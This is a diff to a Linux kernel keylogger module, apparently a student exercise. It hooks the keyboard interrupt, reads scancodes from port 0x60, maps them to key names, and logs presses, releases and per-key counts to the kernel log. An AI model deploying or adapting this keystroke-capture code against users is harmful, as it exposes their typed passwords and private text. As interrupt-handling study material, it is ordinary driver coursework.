@@ -13,70 +13,87 @@ MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
 MODULE_DESCRIPTION("keyboard bad keylogger");
 
 #define	MODULE_NAME		"keylogger"
-#define KEYBOARD_IRQ	1
+#define KEYBOARD_IRQ		1
 
 struct key_map {
 	char			acii;
-	unsigned int	scancode;
+	unsigned int		scancode;
 	const char		*name;
 	bool			pressed;
+	size_t			press_count;
+};
+
+enum e_key_event {
+	PRESS,
+	RELEASE
+};
+
+// this structure describe a log entry
+// key : witch key this key refers to, it will point on key_table
+// timestamp : when this event occured
+// event : was it a press or a release ?
+
+struct key_log_entry {
+	struct key_map		*key;
+	time_t			timestamp;
+	enum e_key_event	event;
 };
 
 struct smart_buffer {
-	char	*buf;
+	void	*buf;
 	size_t	size;
 };
 
 static struct smart_buffer key_log;
 
 static struct key_map key_table[] = {
-	(struct key_map){0x0, 0, "NUL", false},
-	(struct key_map){0x1, 1, "Escape", false},
-	(struct key_map){'\t', 15, "TAB", false},
-	(struct key_map){0x7f, 14, "DEL", false},
-	(struct key_map){'q', 16, "q", false},
-	(struct key_map){'w', 17, "w", false},
-	(struct key_map){'e', 18, "e", false},
-	(struct key_map){'r', 19, "r", false},
-	(struct key_map){'t', 20, "t", false},
-	(struct key_map){'y', 21, "y", false},
-	(struct key_map){'u', 22, "u", false},
-	(struct key_map){'i', 23, "i", false},
-	(struct key_map){'o', 24, "o", false},
-	(struct key_map){'p', 25, "p", false},
-	(struct key_map){'[', 26, "[", false},
-	(struct key_map){']', 27, "]", false},
-	(struct key_map){'\n', 28, "Enter", false},
-	(struct key_map){0x0, 29, "Control-Left", false},
-	(struct key_map){'a', 30, "a", false},
-	(struct key_map){'s', 31, "s", false},
-	(struct key_map){'d', 32, "d", false},
-	(struct key_map){'f', 33, "f", false},
-	(struct key_map){'g', 34, "g", false},
-	(struct key_map){'h', 35, "h", false},
-	(struct key_map){'j', 36, "j", false},
-	(struct key_map){'k', 37, "k", false},
-	(struct key_map){'l', 38, "l", false},
-	(struct key_map){';', 39, ";", false},
-	(struct key_map){'\'', 40, "'", false},
-	(struct key_map){'-', 42, "Shift-Left", false},
-	(struct key_map){'\\', 43, "\\", false},
-	(struct key_map){'z', 44, "z", false},
-	(struct key_map){'x', 45, "x", false},
-	(struct key_map){'c', 46, "c", false},
-	(struct key_map){'v', 47, "v", false},
-	(struct key_map){'b', 48, "b", false},
-	(struct key_map){'n', 49, "n", false},
-	(struct key_map){'m', 50, "m", false},
-	(struct key_map){',', 51, ",", false},
-	(struct key_map){'.', 52, ".", false},
-	(struct key_map){'/', 53, "/", false},
-	(struct key_map){0x0, 54, "Shift-Right", false},
-	(struct key_map){' ', 56, "Alt-Right", false},
-	(struct key_map){' ', 57, "Space", false},
-	(struct key_map){0x0, 58, "Caps-Lock", false},
-	(struct key_map){0x0, 92, "Command-Right", false},
-	(struct key_map){0x0, 0, NULL, false}
+	(struct key_map){0x0, 0, "NUL", false, 0},
+	(struct key_map){0x1, 1, "Escape", false, 0},
+	(struct key_map){'\t', 15, "TAB", false, 0},
+	(struct key_map){0x7f, 14, "DEL", false, 0},
+	(struct key_map){'q', 16, "q", false, 0},
+	(struct key_map){'w', 17, "w", false, 0},
+	(struct key_map){'e', 18, "e", false, 0},
+	(struct key_map){'r', 19, "r", false, 0},
+	(struct key_map){'t', 20, "t", false, 0},
+	(struct key_map){'y', 21, "y", false, 0},
+	(struct key_map){'u', 22, "u", false, 0},
+	(struct key_map){'i', 23, "i", false, 0},
+	(struct key_map){'o', 24, "o", false, 0},
+	(struct key_map){'p', 25, "p", false, 0},
+	(struct key_map){'[', 26, "[", false, 0},
+	(struct key_map){']', 27, "]", false, 0},
+	(struct key_map){'\n', 28, "Enter", false, 0},
+	(struct key_map){0x0, 29, "Control-Left", false, 0},
+	(struct key_map){'a', 30, "a", false, 0},
+	(struct key_map){'s', 31, "s", false, 0},
+	(struct key_map){'d', 32, "d", false, 0},
+	(struct key_map){'f', 33, "f", false, 0},
+	(struct key_map){'g', 34, "g", false, 0},
+	(struct key_map){'h', 35, "h", false, 0},
+	(struct key_map){'j', 36, "j", false, 0},
+	(struct key_map){'k', 37, "k", false, 0},
+	(struct key_map){'l', 38, "l", false, 0},
+	(struct key_map){';', 39, ";", false, 0},
+	(struct key_map){'\'', 40, "'", false, 0},
+	(struct key_map){'-', 42, "Shift-Left", false, 0},
+	(struct key_map){'\\', 43, "\\", false, 0},
+	(struct key_map){'z', 44, "z", false, 0},
+	(struct key_map){'x', 45, "x", false, 0},
+	(struct key_map){'c', 46, "c", false, 0},
+	(struct key_map){'v', 47, "v", false, 0},
+	(struct key_map){'b', 48, "b", false, 0},
+	(struct key_map){'n', 49, "n", false, 0},
+	(struct key_map){'m', 50, "m", false, 0},
+	(struct key_map){',', 51, ",", false, 0},
+	(struct key_map){'.', 52, ".", false, 0},
+	(struct key_map){'/', 53, "/", false, 0},
+	(struct key_map){0x0, 54, "Shift-Right", false, 0},
+	(struct key_map){' ', 56, "Alt-Right", false, 0},
+	(struct key_map){' ', 57, "Space", false, 0},
+	(struct key_map){0x0, 58, "Caps-Lock", false, 0},
+	(struct key_map){0x0, 92, "Command-Right", false, 0},
+	(struct key_map){0x0, 0, NULL, false, 0}
 };
 
 static struct key_map *get_key(const unsigned int scancode)
@@ -111,16 +128,22 @@ static const struct file_operations ops = {
 
 static irqreturn_t	key_handler(int irq, void *dev_id)
 {
-	unsigned int			scancode;
-	struct key_map			*key;
+	const unsigned int	scancode = inb(0x60);
+	struct key_map		*key;
 
-	scancode = inb(0x60);
 	key = get_key(scancode & 0x7f);
-	if (key)
+	if (key) {
 		key->pressed = (scancode & 0x80) == 0;
-
-	pr_info("(scan: %3u) -> %s : %s\n", scancode, (key ? key->name : "/"),
-		(key && key->pressed ? "pressed" : "released"));
+		if (key->pressed)
+			key->press_count += 1;
+		pr_info("(scan: %3u) -> %s : %10s [%4lu]\n", scancode,
+			(key ? key->name : "/"),
+			(key->pressed ? "pressed" : "released"),
+			key->press_count);
+	} else {
+		pr_info("(scan: %3u) -> %s\n", scancode,
+		       ((scancode & 0x80) == 0 ? "pressed" : "released"));
+	}
 	return IRQ_HANDLED;
 }
 
